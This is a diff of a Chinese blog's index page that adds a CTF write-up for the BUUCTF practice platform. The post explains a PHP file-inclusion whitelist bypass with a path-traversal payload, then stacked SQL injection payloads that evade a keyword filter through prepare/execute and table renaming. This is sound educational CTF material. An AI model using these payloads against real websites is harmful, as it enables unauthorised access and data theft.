@@ -298,6 +298,272 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/28/BUUCTF-1/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="木偶">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="木偶's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/28/BUUCTF-1/" itemprop="url">BUUCTF(1)</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-28T17:27:59+08:00">
+                2019-07-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/WP/" itemprop="url" rel="index">
+                    <span itemprop="name">WP</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/07/28/BUUCTF-1/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/07/28/BUUCTF-1/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  727 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  3 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h2><p>好多之前比赛没做也没来得及补的题，良心平台QAQ</p>
+<h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>source.php里源码</p>
+<pre><code>&lt;?php
+highlight_file(__FILE__);
+class emmm
+{
+    public static function checkFile(&amp;$page)
+    {
+        $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
+        if (! isset($page) || !is_string($page)) {
+            echo &quot;you can&apos;t see it&quot;;
+            return false;
+        }
+
+        if (in_array($page, $whitelist)) {
+            return true;
+        }
+
+        $_page = mb_substr(
+            $page,
+            0,
+            mb_strpos($page . &apos;?&apos;, &apos;?&apos;)
+        );
+        if (in_array($_page, $whitelist)) {
+            return true;
+        }
+
+        $_page = urldecode($page);
+        $_page = mb_substr(
+            $_page,
+            0,
+            mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)
+        );
+        if (in_array($_page, $whitelist)) {
+            return true;
+        }
+        echo &quot;you can&apos;t see it&quot;;
+        return false;
+    }
+}
+
+if (! empty($_REQUEST[&apos;file&apos;])
+    &amp;&amp; is_string($_REQUEST[&apos;file&apos;])
+    &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])
+) {
+    include $_REQUEST[&apos;file&apos;];
+    exit;
+} else {
+    echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
+}  
+?&gt; 
+</code></pre><p>可以看到我们需要get传递file参数；<br>checkFile函数检查了传递参数；<br>mb_strpos函数检测第一次出现? 的位置；<br>mb_substr函数返回了file参数0和第一个问号之间的值，<br>in_array函数检测在$whitelist是否含$_page的值也就是source.php和hint.php</p>
+<p>之后存在include函数，所以我们构造payload:</p>
+<pre><code>?file=hint.php?/../../../../../../../../ffffllllaaaagggg
+</code></pre><p>hint.php?/被当成了目录<br>拿到flag</p>
+<h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><p>测试1’or 1=1#可行，存在sql注入<br>1’order by 2#可行，到3报错，查询列数为2<br>然后测试 1’union select 1,2#</p>
+<pre><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);  
+</code></pre><p>select被过滤了，show没有被过滤，构造闭合语句进行<br>查询  </p>
+<h4 id="堆叠注入："><a href="#堆叠注入：" class="headerlink" title="堆叠注入："></a>堆叠注入：</h4><p>在mysql中前语句闭合分号结束后后面的语句也会被执行<br><img src="/2019/07/28/BUUCTF-1/2.png" alt=" "></p>
+<p>查询：  </p>
+<pre><code>1&apos;;show databases;
+</code></pre><p><img src="/2019/07/28/BUUCTF-1/1.png" alt=" "></p>
+<pre><code>1&apos;;show tables;
+</code></pre><p><img src="/2019/07/28/BUUCTF-1/3.png" alt=" "></p>
+<pre><code>1&apos;;show columns from 1919810931114514;
+</code></pre><p>(不知道为啥查不出来<br>破案了，字符串作为表名需要加反引号</p>
+<pre><code>1&apos;;show columns from `1919810931114514`;
+</code></pre><p><img src="/2019/07/28/BUUCTF-1/5.png" alt=" ">‘</p>
+<p>但到此处就无法查询字段的内容了  </p>
+<p>大佬writeup中的姿势一个比一个骚：</p>
+<h4 id="存储过程绕过"><a href="#存储过程绕过" class="headerlink" title="存储过程绕过"></a>存储过程绕过</h4><p>sql serve中给变量幅值可以用</p>
+<pre><code>set @变量名=&apos;字符串&apos;;
+</code></pre><p>prepare语句用于预备一个语句，并指定语句名称，以后可用名称引用该语句。语句名称对大小写不敏感。from后可以是一个文字字符串，也可以是一个包含了语句文本的用户变量。该文本必须表现为一个单一的SQL语句，而不是多个语句。<br>语法</p>
+<pre><code>prepare 语句定义名称 from 变量名称;
+</code></pre><p>execute语句用于执行命令<br>语法   </p>
+<pre><code>execute 变量名称;
+</code></pre><p><img src="/2019/07/28/BUUCTF-1/6.png" alt=" "><br>payload：</p>
+<pre><code>1&apos;;Set @a=concat(&apos;s&apos;,&apos;elect * from `1919810931114514`&apos;);prepare s from @a;execute s;
+</code></pre><p>strstr对set进行了一步过滤，不过没什么影响，大小写就能绕过(这么看这种解法应该是预期解。</p>
+<h4 id="重命名"><a href="#重命名" class="headerlink" title="重命名"></a>重命名</h4><p>这个真的是太骚了<br>正则中没有过滤alert和rename关键字  </p>
+<p>alter和rename命令</p>
+<p>alter table 原表名 rename to 新表名;</p>
+<p>alter table 表名 change 要修改的字段名  新字段名 新字段的数据类型;</p>
+<p>(题目好像挂了，明天写</p>
+<h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/Hash长度扩展攻击/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1912,193 +2178,6 @@ content:&quot;(776299203/883952569)+(547789483)*683263066-(215127140)=?&quot;;
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/27/SQL注入/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="木偶">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="木偶's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/01/27/SQL注入/" itemprop="url">SQL攻击</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-27T12:11:09+08:00">
-                2019-01-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/WP/" itemprop="url" rel="index">
-                    <span itemprop="name">WP</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2019/01/27/SQL注入/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2019/01/27/SQL注入/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  152 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="hgame-sql"><a href="#hgame-sql" class="headerlink" title="hgame sql"></a>hgame sql</h2><p>hgame两道sql题都不算太难，有验证不过没过滤，再次响起招新被时间盲注支配的恐惧~，整理一下大致的框架，<br></p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/01/27/SQL注入/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2149,7 +2228,7 @@ content:&quot;(776299203/883952569)+(547789483)*683263066-(215127140)=?&quot;;
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-count">17</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
